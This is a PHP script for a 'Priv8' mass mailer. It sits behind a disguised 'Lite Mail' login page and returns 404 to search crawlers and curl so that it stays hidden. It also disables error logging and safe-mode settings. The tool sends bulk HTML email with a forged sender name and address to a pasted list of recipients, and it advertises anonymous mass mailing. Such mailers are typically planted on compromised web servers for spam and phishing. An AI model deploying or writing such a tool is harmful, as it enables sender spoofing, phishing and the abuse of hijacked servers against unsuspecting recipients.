<?php
session_start();@ini_set('output_buffering', 0);@ini_set('error_log', NONE);@ini_set('safe_mode_gid', OFF);@ini_set('safe_mode', OFF);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@ini_set('display_errors', 0);@ini_set('disable_functions', NONE);@error_reporting(0);@set_time_limit(0);if(version_compare(PHP_VERSION,'5.3.0','<')){@set_magic_quotes_runtime(0);}@clearstatcache();
if (!empty($_SERVER['HTTP_USER_AGENT'])) { $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl", "linecorp"); if (preg_match('/'.implode('|', $userAgents).'/i', $_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;} }
$CREDENTIALS = array('Fray117' => '34e4b7f1093144e1e178917946f46e5b');
function login(){?>
  <!DOCTYPE HTML>
  <html>
  <head>
    <title>Mailbox</title>
    <style type="text/css">
    html {margin: 20px auto;background: #000000;color: #00FF00;text-align: center;font-family: "Courier New";white-space: nowrap;}
    header {color: #00FF00;margin: 10px auto;}body,h1 {font-family: "Courier New"}form {font-family: "Courier New";white-space: nowrap;}h1{font-weight: lighter;font-size: 60px;}input[type=password]{font-family: 'Courier New';font-size: 20px;width: 400px;height: 40px;color: red;background: transparent;border: 1px solid #00FF00;text-align: center;}input[type=password]:hover {background-color: #1A1A1A}
    input[type=text]{font-size: 20px;width: 400px;height: 40px;color: #00FF00;background: transparent;border: 1px solid #00FF00;text-align: center;font-family: 'Courier New';font-weight: lighter;}input[type=text]:hover{background-color: #1A1A1A;}input[type=submit] {font-family: 'Courier New';font-size: 20px;width: 400px;height: 40px;color: #00FF00;background: #000000;border: 1px solid #00FF00;text-align: center;}input[type=submit]:hover{background-color: #00FF00;color: #000000;}.button{padding-left: 90px;}
    </style>
  </head>
  <center>
  <body>
    <div id="login">
      <header>
      	<pre>
          <h1 class="center jumbo">Lite Mail</h1>
          <form class="center" method="post">
            <input type="text" name="username" placeholder="Username" required autocomplete="off"><br>
            <input type="password" name="password" placeholder="Password" required autocomplete="off"><br><br>
            <input type="submit" name="login" value="LOGIN">
          </form>
      	</pre>
      </header>
    </div>
  </body>
  <?php
  exit;
}
if (!isset($_SESSION[md5('Priv8Mailer')])) {
  if ($CREDENTIALS[$_POST['username']] == md5($_POST['password'])) {
    $_SESSION['username'] = $_POST['username'];
    $_SESSION[md5('Priv8Mailer')] = true;
  }else{
    login();
  }
}
?>
<head>
  <title>Priv8 Lite Mailer</title>
  <meta charset="UTF-8"><meta name="author" content="Agus Setya R"><meta name="application-name" content="Mailer"><meta name="description" content="Send mail with this tools, be anonymous and send massive mail in one time."><meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style type="text/css">
  .credit{color: #FFFFFF;font-family: monospace;font-size: 15px;position:absolute;;left:50%;bottom:0;transform:translate(-50%,0%);-ms-transform:translate(-50%,0%)}html{margin:10px auto;color:#FFFFFF;background-color:#000000;}h1{font-size:50px;text-align:center;margin:0px auto;font-family: monospace;font-weight:lighter;}.mailer[type=text]{background: #FFFFFF;padding: 7px;margin: 5px auto;margin-left: 0px;border: 0;border-bottom: 1px solid #000000;color: #000000;width: 250px;height: 40px;font-family: monospace;font-size: 20px;}.btn {border-style: none;color: #FFFFFF;width: 90%;height: 50px;background-color: transparent;text-decoration: none;font-family: monospace;font-size: 20px;position:absolute;left:50%;transform:translate(-50%,0%);-ms-transform:translate(-50%,0%)}.btn:hover {cursor: default;text-decoration: none;background-color: #FFFFFF;color: #000000;}table {margin-left: 30px;font-size: 20px;}textarea {color: #000000;background: whitesmoke;padding: 5px;resize: none;border: 1px solid #000000;width: 550px;height: 250px;outline: none;font-family: monospace;font-size: 18px;}
  </style>
</head>
<body>
  <div>
    <h1>Fray117 Mini Mailer</h1><br>
    <table width="95%" align="center">
      <form class="mailer" method="post" enctype="multipart/form-data">
        <tr><td><pre>Subject   : <input class="mailer" type="text" placeholder="Email Subject" name="subject" required></td><td><pre>Email  : <input class="mailer" type="text" placeholder="mail@domain.ltd" name="from_email" required></td></tr>
        <tr><td><pre>Name      : <input class="mailer" type="text" placeholder="Email Sender" name="from_name" required></td><td><pre>CC     : <input class="mailer" type="text" name="cc" placeholder="email@mail.ltd" required></td></tr>
        <tr><td><pre>Mail List : <br><textarea placeholder="reciepent@domain.ltd" name="mailist" required></textarea></td>
        <td><pre>Content: <br><textarea placeholder="Raw Text / Markup" name="letter" required></textarea></td></tr>
        <tr><td><input type="submit" class="btn" name="send" value="SEND"></td></tr>
      </form>
    </table>
    <span class="credit">Copyright (c) 2018 Fray117 All Rights Reserved.</span>
  </div>
</body>
<?php
function clean($string){
  $bad = array("content-type","bcc:","to:","cc:","href");
  return str_replace($bad, "", $string);
}
$subject = htmlspecialchars(trim(clean($_POST['subject'])));
$name = htmlspecialchars(trim(clean($_POST['form_name'])));
$mail = htmlspecialchars(trim(clean($_POST['from_email'])));
$cc = htmlspecialchars(trim(clean($_POST['cc'])));
$mailist = explode("\r\n", htmlspecialchars(clean($_POST['mailist'])));
$letter = $_POST['letter'];
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From: '.$name.'<'.$mail.'>' . "\r\n";
$email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
if (isset($_POST['send'])){
  echo "<pre style='padding-left: 30px; font-size: 15px;'>";
  foreach ($mailist as $mail){
    if (!preg_match($email_exp, $mail)){
      echo "Email <b>$mail</b> not valid.<br>";
    } else {
      echo "Sending to <b>$mail</b> -> ";
      if (@mail($mail, $subject, $letter, $headers)){
        echo "<font color=#00FF00>SUCCESS</font><br>";
      }else {
        echo "<font color=#ff0000>FAILED</font><br>";
      }
    }
  }
  echo "</pre>";
} ?>
